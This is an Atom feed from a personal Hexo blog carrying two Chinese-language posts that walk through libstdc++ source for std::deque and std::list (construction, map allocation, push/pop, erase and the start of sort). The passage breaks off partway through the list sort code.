<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Room of Requirement</title>
  
  <subtitle>pwn what you want</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://siriuswhiter.tk/"/>
  <updated>2020-03-22T02:34:57.051Z</updated>
  <id>http://siriuswhiter.tk/</id>
  
  <author>
    <name>Sirius Whiter</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>c++ STL 源码分析(四)</title>
    <link href="http://siriuswhiter.tk/2020/03/21/c-stl-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E5%9B%9B/"/>
    <id>http://siriuswhiter.tk/2020/03/21/c-stl-源码分析-四/</id>
    <published>2020-03-21T07:50:53.000Z</published>
    <updated>2020-03-22T02:34:57.051Z</updated>
    
    <content type="html"><![CDATA[<h1 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h1><p>双向开口的连续线性空间，因为要在头部也要插入，所以不是简单的像vector一样分配。</p><p>deque没有容量的概念，实际上底层是以分段连续空间组合而成。 </p><h2 id="Constructor"><a href="#Constructor" class="headerlink" title="Constructor"></a>Constructor</h2><p>指定初值。such as:deque<int> l = {2,3,1};</int></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    deque(initializer_list&lt;value_type&gt; __l,</span><br><span class="line">    const allocator_type&amp; __a = allocator_type())</span><br><span class="line">    : _Base(__a)</span><br><span class="line">    &#123;</span><br><span class="line">_M_range_initialize(__l.begin(), __l.end(),</span><br><span class="line">            random_access_iterator_tag());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这样的调用的是_M_range_initialize<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">template &lt;typename _Tp, typename _Alloc&gt;</span><br><span class="line">  template &lt;typename _ForwardIterator&gt;</span><br><span class="line">    void</span><br><span class="line">    deque&lt;_Tp, _Alloc&gt;::</span><br><span class="line">    _M_range_initialize(_ForwardIterator __first, _ForwardIterator __last,</span><br><span class="line">                        std::forward_iterator_tag)</span><br><span class="line">    &#123;</span><br><span class="line">      const size_type __n = std::distance(__first, __last);</span><br><span class="line">      this-&gt;_M_initialize_map(__n);</span><br><span class="line"></span><br><span class="line">      _Map_pointer __cur_node;</span><br><span class="line">      __try</span><br><span class="line">        &#123;</span><br><span class="line">            //尝试遍历map中的节点并调用__uniintialized_copy_a将初值拷贝进去，最后将剩下的一点拷贝进最后一个缓冲区</span><br><span class="line">          for (__cur_node = this-&gt;_M_impl._M_start._M_node;</span><br><span class="line">               __cur_node &lt; this-&gt;_M_impl._M_finish._M_node;</span><br><span class="line">               ++__cur_node)</span><br><span class="line">     &#123;</span><br><span class="line">_ForwardIterator __mid = __first;</span><br><span class="line">std::advance(__mid, _S_buffer_size());</span><br><span class="line">std::__uninitialized_copy_a(__first, __mid, *__cur_node,</span><br><span class="line">    _M_get_Tp_allocator());</span><br><span class="line">__first = __mid;</span><br><span class="line">     &#125;</span><br><span class="line">          std::__uninitialized_copy_a(__first, __last,</span><br><span class="line">this-&gt;_M_impl._M_finish._M_first,</span><br><span class="line">_M_get_Tp_allocator());</span><br><span class="line">        &#125;</span><br><span class="line">      __catch(...)</span><br><span class="line">        &#123;</span><br><span class="line">          std::_Destroy(this-&gt;_M_impl._M_start,</span><br><span class="line">  iterator(*__cur_node, __cur_node),</span><br><span class="line">  _M_get_Tp_allocator());</span><br><span class="line">          __throw_exception_again;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>首先得到长度，再初始化map<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> template&lt;typename _Tp, typename _Alloc&gt;</span><br><span class="line">   void</span><br><span class="line">   _Deque_base&lt;_Tp, _Alloc&gt;::</span><br><span class="line">   _M_initialize_map(size_t __num_elements)</span><br><span class="line">   &#123;</span><br><span class="line">       //单个连续缓冲区大小为512字节</span><br><span class="line">       &lt;!-- #ifndef _GLIBCXX_DEQUE_BUF_SIZE</span><br><span class="line">       #define _GLIBCXX_DEQUE_BUF_SIZE 512</span><br><span class="line">       #endif</span><br><span class="line"></span><br><span class="line">       inline size_t</span><br><span class="line">       __deque_buf_size(size_t __size)</span><br><span class="line">       &#123; return (__size &lt; _GLIBCXX_DEQUE_BUF_SIZE</span><br><span class="line">    ? size_t(_GLIBCXX_DEQUE_BUF_SIZE / __size) : size_t(1)); &#125; --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     const size_t __num_nodes = (__num_elements/ __deque_buf_size(sizeof(_Tp))</span><br><span class="line">  + 1);</span><br><span class="line"></span><br><span class="line">       //_M_map_size最小为8</span><br><span class="line">     this-&gt;_M_impl._M_map_size = std::max((size_t) _S_initial_map_size,</span><br><span class="line">   size_t(__num_nodes + 2));</span><br><span class="line">     this-&gt;_M_impl._M_map = _M_allocate_map(this-&gt;_M_impl._M_map_size);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       //这里注意到，map中的节点地址，并不是从头开始存放的，而是尽量往中间存放。</span><br><span class="line">       //因为需要应对两头存放时可能需要分配新的缓冲区，若直接在头部存放，则push_front容易变得低效，因为可能得经常变动map。</span><br><span class="line">     _Tp** __nstart = (this-&gt;_M_impl._M_map</span><br><span class="line">+ (this-&gt;_M_impl._M_map_size - __num_nodes) / 2);</span><br><span class="line">     _Tp** __nfinish = __nstart + __num_nodes;</span><br><span class="line"></span><br><span class="line">     __try</span><br><span class="line">&#123; _M_create_nodes(__nstart, __nfinish); &#125;</span><br><span class="line">     __catch(...)</span><br><span class="line">&#123;</span><br><span class="line">  _M_deallocate_map(this-&gt;_M_impl._M_map, this-&gt;_M_impl._M_map_size);</span><br><span class="line">  this-&gt;_M_impl._M_map = 0;</span><br><span class="line">  this-&gt;_M_impl._M_map_size = 0;</span><br><span class="line">  __throw_exception_again;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">     this-&gt;_M_impl._M_start._M_set_node(__nstart);</span><br><span class="line">     this-&gt;_M_impl._M_finish._M_set_node(__nfinish - 1);</span><br><span class="line">     this-&gt;_M_impl._M_start._M_cur = _M_impl._M_start._M_first;//第一个元素的位置</span><br><span class="line">     this-&gt;_M_impl._M_finish._M_cur = (this-&gt;_M_impl._M_finish._M_first</span><br><span class="line">+ __num_elements</span><br><span class="line">% __deque_buf_size(sizeof(_Tp)));           //最后一个元素后的位置</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>这里可以看到该结构体主要有四个部分，</p><ol><li>_M_map，指向map地址，map中存储各个缓冲区的地址。</li><li>_M_map_size，指定map大小。</li><li>_M_start，指向map中第一个节点的缓冲区。<br>struct _Deque_iterator<br>{<br> _TP<em> _M_cur;   使用中的缓冲区指针<br> _Tp</em> _M_first; 第一个缓冲区的头指针<br> _Tp* _M_last;  第一个缓冲区的尾指针<br> _Tp** _M_node;  在map中的node的位置<br>}</li><li>_M_finish，指向map中最后一个节点的缓冲区，结构与_M_start相同。</li></ol><p>初始化就是进行空间的分配及对这些值进行相应的设置。</p><p>同时注意到后两个就是deque的迭代器，其重构了许多符号来应对空间的不连续操作，因为比较简单就不分析了。</p><h2 id="push-back-amp-amp-pop-back-amp-amp-push-front-amp-amp-pop-front"><a href="#push-back-amp-amp-pop-back-amp-amp-push-front-amp-amp-pop-front" class="headerlink" title="push_back &amp;&amp; pop_back &amp;&amp; push_front &amp;&amp; pop_front"></a>push_back &amp;&amp; pop_back &amp;&amp; push_front &amp;&amp; pop_front</h2><ol><li>push_back</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">push_back(value_type&amp;&amp; __x)</span><br><span class="line">&#123; emplace_back(std::move(__x)); &#125;</span><br></pre></td></tr></table></figure><p>跟进<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename _Tp, typename _Alloc&gt;</span><br><span class="line">template&lt;typename... _Args&gt;</span><br><span class="line">    void</span><br><span class="line">    deque&lt;_Tp, _Alloc&gt;::</span><br><span class="line">    emplace_back(_Args&amp;&amp;... __args)</span><br><span class="line">    &#123;</span><br><span class="line">if (this-&gt;_M_impl._M_finish._M_cur</span><br><span class="line">    != this-&gt;_M_impl._M_finish._M_last - 1)  //最后一个缓冲区还有位置</span><br><span class="line">    &#123;</span><br><span class="line">    this-&gt;_M_impl.construct(this-&gt;_M_impl._M_finish._M_cur,</span><br><span class="line">                std::forward&lt;_Args&gt;(__args)...);</span><br><span class="line">    ++this-&gt;_M_impl._M_finish._M_cur;</span><br><span class="line">    &#125;</span><br><span class="line">else</span><br><span class="line">    _M_push_back_aux(std::forward&lt;_Args&gt;(__args)...);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>分析下没有位置的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename _Tp, typename _Alloc&gt;</span><br><span class="line">template&lt;typename... _Args&gt;</span><br><span class="line">    void</span><br><span class="line">    deque&lt;_Tp, _Alloc&gt;::</span><br><span class="line">    _M_push_back_aux(_Args&amp;&amp;... __args)</span><br><span class="line">    &#123;</span><br><span class="line">        //若map中节点位置已满，则需要一块更大的缓冲区存放map，这里调用的是_M_reallocate_map</span><br><span class="line">_M_reserve_map_at_back();</span><br><span class="line">          &lt;!-- void</span><br><span class="line">            _M_reserve_map_at_back(size_type __nodes_to_add = 1)</span><br><span class="line">            &#123;</span><br><span class="line">                if (__nodes_to_add + 1 &gt; this-&gt;_M_impl._M_map_size</span><br><span class="line">                    - (this-&gt;_M_impl._M_finish._M_node - this-&gt;_M_impl._M_map))</span><br><span class="line">                _M_reallocate_map(__nodes_to_add, false);  </span><br><span class="line">            &#125; --&gt;</span><br><span class="line">*(this-&gt;_M_impl._M_finish._M_node + 1) = this-&gt;_M_allocate_node(); 分配新节点</span><br><span class="line">__try</span><br><span class="line">    &#123;</span><br><span class="line">    this-&gt;_M_impl.construct(this-&gt;_M_impl._M_finish._M_cur,</span><br><span class="line">                std::forward&lt;_Args&gt;(__args)...);</span><br><span class="line">    this-&gt;_M_impl._M_finish._M_set_node(this-&gt;_M_impl._M_finish._M_node  //_M_finish的_M_node指向新节点</span><br><span class="line">                    + 1);</span><br><span class="line">    this-&gt;_M_impl._M_finish._M_cur = this-&gt;_M_impl._M_finish._M_first;    </span><br><span class="line">    &#125;</span><br><span class="line">__catch(...)</span><br><span class="line">    &#123;</span><br><span class="line">    _M_deallocate_node(*(this-&gt;_M_impl._M_finish._M_node + 1));</span><br><span class="line">    __throw_exception_again;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>对map的操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> template &lt;typename _Tp, typename _Alloc&gt;</span><br><span class="line">   void</span><br><span class="line">   deque&lt;_Tp, _Alloc&gt;::</span><br><span class="line">   _M_reallocate_map(size_type __nodes_to_add, bool __add_at_front)</span><br><span class="line">   &#123;</span><br><span class="line">     const size_type __old_num_nodes</span><br><span class="line">= this-&gt;_M_impl._M_finish._M_node - this-&gt;_M_impl._M_start._M_node + 1;</span><br><span class="line">     const size_type __new_num_nodes = __old_num_nodes + __nodes_to_add;</span><br><span class="line"></span><br><span class="line">     _Map_pointer __new_nstart;</span><br><span class="line"></span><br><span class="line">     //如果原先map足够大，则根据需要移动下map中的指针即可</span><br><span class="line">     if (this-&gt;_M_impl._M_map_size &gt; 2 * __new_num_nodes)</span><br><span class="line">&#123;</span><br><span class="line">  __new_nstart = this-&gt;_M_impl._M_map + (this-&gt;_M_impl._M_map_size</span><br><span class="line"> - __new_num_nodes) / 2</span><br><span class="line">                 + (__add_at_front ? __nodes_to_add : 0);</span><br><span class="line">  if (__new_nstart &lt; this-&gt;_M_impl._M_start._M_node)</span><br><span class="line">    std::copy(this-&gt;_M_impl._M_start._M_node,</span><br><span class="line">      this-&gt;_M_impl._M_finish._M_node + 1,</span><br><span class="line">      __new_nstart);</span><br><span class="line">  else</span><br><span class="line">    std::copy_backward(this-&gt;_M_impl._M_start._M_node,</span><br><span class="line">       this-&gt;_M_impl._M_finish._M_node + 1,</span><br><span class="line">       __new_nstart + __old_num_nodes);</span><br><span class="line">&#125;</span><br><span class="line">       //若map大小不够，则需要重新分配map，并把原先的map拷贝到新map中特定的位置</span><br><span class="line">     else</span><br><span class="line">&#123;</span><br><span class="line">  size_type __new_map_size = this-&gt;_M_impl._M_map_size</span><br><span class="line">                             + std::max(this-&gt;_M_impl._M_map_size,</span><br><span class="line">__nodes_to_add) + 2;</span><br><span class="line"></span><br><span class="line">  _Map_pointer __new_map = this-&gt;_M_allocate_map(__new_map_size);</span><br><span class="line">  __new_nstart = __new_map + (__new_map_size - __new_num_nodes) / 2</span><br><span class="line">                 + (__add_at_front ? __nodes_to_add : 0);</span><br><span class="line">  std::copy(this-&gt;_M_impl._M_start._M_node,</span><br><span class="line">    this-&gt;_M_impl._M_finish._M_node + 1,</span><br><span class="line">    __new_nstart);</span><br><span class="line">  _M_deallocate_map(this-&gt;_M_impl._M_map, this-&gt;_M_impl._M_map_size);</span><br><span class="line"></span><br><span class="line">  this-&gt;_M_impl._M_map = __new_map;</span><br><span class="line">  this-&gt;_M_impl._M_map_size = __new_map_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">     this-&gt;_M_impl._M_start._M_set_node(__new_nstart);</span><br><span class="line">     this-&gt;_M_impl._M_finish._M_set_node(__new_nstart + __old_num_nodes - 1);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><ol start="2"><li>pop_back</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    void</span><br><span class="line">    pop_back() _GLIBCXX_NOEXCEPT  </span><br><span class="line">    &#123;</span><br><span class="line">        //若最后一个缓冲区不为空，则直接弹出</span><br><span class="line">if (this-&gt;_M_impl._M_finish._M_cur</span><br><span class="line">    != this-&gt;_M_impl._M_finish._M_first)</span><br><span class="line">    &#123;</span><br><span class="line">    --this-&gt;_M_impl._M_finish._M_cur;</span><br><span class="line">    this-&gt;_M_impl.destroy(this-&gt;_M_impl._M_finish._M_cur);</span><br><span class="line">    &#125;</span><br><span class="line">else</span><br><span class="line">    _M_pop_back_aux();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>否则回收最后一个节点，调整_M_finish结构为前一个node节点的缓冲区并将最后一个元素弹出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">template &lt;typename _Tp, typename _Alloc&gt;</span><br><span class="line">void deque&lt;_Tp, _Alloc&gt;::</span><br><span class="line">_M_pop_back_aux()</span><br><span class="line">&#123;</span><br><span class="line">    _M_deallocate_node(this-&gt;_M_impl._M_finish._M_first);</span><br><span class="line">    this-&gt;_M_impl._M_finish._M_set_node(this-&gt;_M_impl._M_finish._M_node - 1);</span><br><span class="line">    this-&gt;_M_impl._M_finish._M_cur = this-&gt;_M_impl._M_finish._M_last - 1;</span><br><span class="line">    this-&gt;_M_impl.destroy(this-&gt;_M_impl._M_finish._M_cur);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里发现即使deque中为空也不会报错</p><ol start="3"><li>push_front &amp;&amp; pop_front</li></ol><p>流程与push_back，pop_back基本一致，不再做过多分析。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;deque&quot;&gt;&lt;a href=&quot;#deque&quot; class=&quot;headerlink&quot; title=&quot;deque&quot;&gt;&lt;/a&gt;deque&lt;/h1&gt;&lt;p&gt;双向开口的连续线性空间，因为要在头部也要插入，所以不是简单的像vector一样分配。&lt;/p&gt;
&lt;p&gt;deque没有容
      
    
    </summary>
    
      <category term="STL" scheme="http://siriuswhiter.tk/categories/stl/"/>
    
    
      <category term="c++" scheme="http://siriuswhiter.tk/tags/c/"/>
    
      <category term="STL" scheme="http://siriuswhiter.tk/tags/stl/"/>
    
  </entry>
  
  <entry>
    <title>c++ STL 源码分析(三)</title>
    <link href="http://siriuswhiter.tk/2020/03/17/c-stl-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E4%B8%89/"/>
    <id>http://siriuswhiter.tk/2020/03/17/c-stl-源码分析-三/</id>
    <published>2020-03-17T05:23:39.000Z</published>
    <updated>2020-03-22T03:02:26.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="list"><a href="#list" class="headerlink" title="list"></a>list</h1><ul><li>list调试的时候比较奇怪，许多关于链表操作的函数无法跟进到源代码，原因暂时未知。</li></ul><p>底层为双向链表，节点的数据结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">namespace __detail</span><br><span class="line">&#123;</span><br><span class="line">    struct _List_node_base</span><br><span class="line">    &#123;</span><br><span class="line">        _List_node_base* _M_next;</span><br><span class="line">        _List_node_base* _M_prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">template&lt;typename _Tp&gt;</span><br><span class="line">struct _List_node : public __detail::_List_node_base</span><br><span class="line">&#123;</span><br><span class="line">    _Tp _M_data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>list的迭代器不再是普通的指针，其为结构体_List_iterator/_List_const_iterator，其中重载了许多符号，如++不再是写一个地址块而是根据_M_next指针得到下一块内存的地址，其他的同理。</p><h2 id="Constructors"><a href="#Constructors" class="headerlink" title="Constructors"></a>Constructors</h2><p>指定初值。such as:list<int> l = {2,3,1};</int></p><p>初值先被放入底层的array中，之后再将其置入list<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename _InputIterator&gt;</span><br><span class="line">void</span><br><span class="line">_M_initialize_dispatch(_InputIterator __first, _InputIterator __last,</span><br><span class="line">            __false_type)</span><br><span class="line">&#123;</span><br><span class="line">    for (; __first != __last; ++__first)</span><br><span class="line">        emplace_back(*__first);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟进，调用list的_M_insert函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename... _Args&gt;</span><br><span class="line">void</span><br><span class="line">emplace_back(_Args&amp;&amp;... __args)</span><br><span class="line">&#123; this-&gt;_M_insert(end(), std::forward&lt;_Args&gt;(__args)...); &#125;</span><br></pre></td></tr></table></figure></p><p>_M_insert实现，创建节点之后调用_M_hook将其链入链表的__position位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename... _Args&gt;</span><br><span class="line">void</span><br><span class="line">_M_insert(iterator __position, _Args&amp;&amp;... __args)</span><br><span class="line">&#123;</span><br><span class="line">_Node* __tmp = _M_create_node(std::forward&lt;_Args&gt;(__args)...);</span><br><span class="line">__tmp-&gt;_M_hook(__position._M_node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>_M_create_node，先调用_M_get_node分配一块内存，之后尝试将值写入，成功后返回指针__p<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename... _Args&gt;</span><br><span class="line">_Node*</span><br><span class="line">_M_create_node(_Args&amp;&amp;... __args)</span><br><span class="line">&#123;</span><br><span class="line">_Node* __p = this-&gt;_M_get_node();</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">    _M_get_Node_allocator().construct(__p,</span><br><span class="line">                std::forward&lt;_Args&gt;(__args)...);</span><br><span class="line">&#125;</span><br><span class="line">__catch(...)</span><br><span class="line">&#123;</span><br><span class="line">    _M_put_node(__p);</span><br><span class="line">    __throw_exception_again;</span><br><span class="line">&#125;</span><br><span class="line">return __p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>_M_hook尝试单步跟进但直接跳过<br>查看定义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_M_hook(_List_node_base* const __position) _GLIBCXX_USE_NOEXCEPT;</span><br></pre></td></tr></table></figure></p><h2 id="push-back-amp-amp-pop-back-amp-amp-push-front-amp-amp-pop-front"><a href="#push-back-amp-amp-pop-back-amp-amp-push-front-amp-amp-pop-front" class="headerlink" title="push_back &amp;&amp; pop_back &amp;&amp; push_front &amp;&amp; pop_front"></a>push_back &amp;&amp; pop_back &amp;&amp; push_front &amp;&amp; pop_front</h2><p>push_back 与 push_front 均是调用_M_insert函数将元素插入，区别在于第一个参数分别为end()，begin()</p><p>pop_back 与 pop_front 则均调用_M_earse函数将迭代器指向的位置的元素移除<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">pop_back() _GLIBCXX_NOEXCEPT</span><br><span class="line">&#123; this-&gt;_M_erase(iterator(this-&gt;_M_impl._M_node._M_prev)); &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void</span><br><span class="line">pop_front() _GLIBCXX_NOEXCEPT</span><br><span class="line">&#123; this-&gt;_M_erase(begin()); &#125;</span><br></pre></td></tr></table></figure></p><p>跟入_M_erase函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_M_erase(iterator __position) _GLIBCXX_NOEXCEPT</span><br><span class="line">&#123;</span><br><span class="line">    __position._M_node-&gt;_M_unhook();</span><br><span class="line">    _Node* __n = static_cast&lt;_Node*&gt;(__position._M_node);</span><br><span class="line">    _M_get_Node_allocator().destroy(__n);</span><br><span class="line">    _M_put_node(__n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>基本操作就是将其解链，然后获得其指针，destory实际上就是调用了其析构函数，之后调用_M_put_node将指针delete</p><p>这里重点的_M_unhook函数也同_M_hook一样无法找到实现。</p><h2 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h2><p>没有太懂…<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">template&lt;typename _Tp, typename _Alloc&gt;</span><br><span class="line">void</span><br><span class="line">list&lt;_Tp, _Alloc&gt;::</span><br><span class="line">sort()</span><br><span class="line">&#123;</span><br><span class="line">    // Do nothing if the list has length 0 or 1.</span><br><span class="line">    if (this-&gt;_M_impl._M_node._M_next != &amp;this-&gt;_M_impl._M_node</span><br><span class="line">    &amp;&amp; this-&gt;_M_impl._M_node._M_next-&gt;_M_next != &amp;this-&gt;_M_impl._M_node)</span><br><span class="line">    &#123;</span><br><span class="line">    list __carry;</span><br><span class="line">    list 